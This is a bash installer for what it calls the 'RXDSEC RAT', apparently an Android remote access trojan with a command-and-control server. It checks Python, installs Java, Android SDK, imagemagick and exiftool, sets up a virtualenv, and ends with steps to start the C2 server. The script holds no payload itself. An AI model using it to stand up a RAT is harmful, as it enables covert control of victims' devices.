#!/bin/bash
# Installation script for RXDSEC RAT
# This script installs all required dependencies for the RXDSEC RAT

set -e  # Exit immediately if a command exits with a non-zero status

# Define colors for output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${GREEN}=== RXDSEC RAT Installation Script ===${NC}"
echo -e "${YELLOW}This script will install all required dependencies for RXDSEC RAT${NC}"
echo

# Check if Python 3.9+ is installed
echo -e "${GREEN}Checking Python version...${NC}"
if command -v python3 &>/dev/null; then
    PYTHON_VERSION=$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')
    PYTHON_MAJOR=$(echo $PYTHON_VERSION | cut -d. -f1)
    PYTHON_MINOR=$(echo $PYTHON_VERSION | cut -d. -f2)
    
    if [ "$PYTHON_MAJOR" -ge 3 ] && [ "$PYTHON_MINOR" -ge 9 ]; then
        echo -e "${GREEN}Python $PYTHON_VERSION detected. Continuing...${NC}"
        PYTHON_CMD="python3"
    else
        echo -e "${RED}Python 3.9+ is required. Found Python $PYTHON_VERSION${NC}"
        exit 1
    fi
else
    echo -e "${RED}Python 3 not found. Please install Python 3.9 or higher${NC}"
    exit 1
fi

# Detect OS
echo -e "${GREEN}Detecting operating system...${NC}"
if [ "$(uname)" == "Darwin" ]; then
    # macOS
    OS="macos"
    echo -e "${GREEN}Detected macOS${NC}"
elif [ "$(uname)" == "Linux" ]; then
    # Linux
    OS="linux"
    echo -e "${GREEN}Detected Linux${NC}"
    
    # Check if it's Debian/Ubuntu or other
    if [ -f /etc/debian_version ]; then
        LINUX_DISTRO="debian"
        echo -e "${GREEN}Detected Debian/Ubuntu${NC}"
    else
        LINUX_DISTRO="other"
        echo -e "${YELLOW}Detected Linux (non-Debian). You may need to install dependencies manually${NC}"
    fi
else
    # Windows or other
    OS="other"
    echo -e "${YELLOW}Detected non-Linux/macOS system. You may need to install dependencies manually${NC}"
fi

# Install system dependencies based on OS
echo -e "${GREEN}Installing system dependencies...${NC}"
if [ "$OS" == "macos" ]; then
    # Check if Homebrew is installed
    if ! command -v brew &>/dev/null; then
        echo -e "${YELLOW}Homebrew not found. Installing Homebrew...${NC}"
        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    fi
    
    # Install dependencies using Homebrew
    echo -e "${GREEN}Installing dependencies using Homebrew...${NC}"
    brew install openjdk android-sdk imagemagick exiftool
    
elif [ "$OS" == "linux" ] && [ "$LINUX_DISTRO" == "debian" ]; then
    # Install dependencies using apt
    echo -e "${GREEN}Installing dependencies using apt...${NC}"
    sudo apt update
    sudo apt install -y openjdk-11-jdk imagemagick libimage-exiftool-perl
    
    # For Android SDK tools (zipalign, apktool)
    echo -e "${YELLOW}For Android SDK tools, consider installing Android Studio${NC}"
    
else
    echo -e "${YELLOW}Please install system dependencies manually. See DEPENDENCIES.md for details${NC}"
fi

# Create python virtual environment
echo -e "${GREEN}Creating Python virtual environment...${NC}"
$PYTHON_CMD -m venv venv
source venv/bin/activate

# Upgrade pip
echo -e "${GREEN}Upgrading pip...${NC}"
pip install --upgrade pip

# Install Python dependencies using setup.py
echo -e "${GREEN}Installing Python dependencies...${NC}"
pip install -e .

# Install development dependencies
echo -e "${GREEN}Installing development dependencies...${NC}"
pip install -e ".[dev]"

echo
echo -e "${GREEN}=== Installation Complete ===${NC}"
echo -e "${GREEN}RXDSEC RAT has been successfully installed!${NC}"
echo
echo -e "To start the C2 server:"
echo -e "  1. Activate virtual environment: ${YELLOW}source venv/bin/activate${NC}"
echo -e "  2. Start server: ${YELLOW}cd c2_server && python server.py${NC}"
echo
echo -e "For more information, refer to README.md and DEPENDENCIES.md"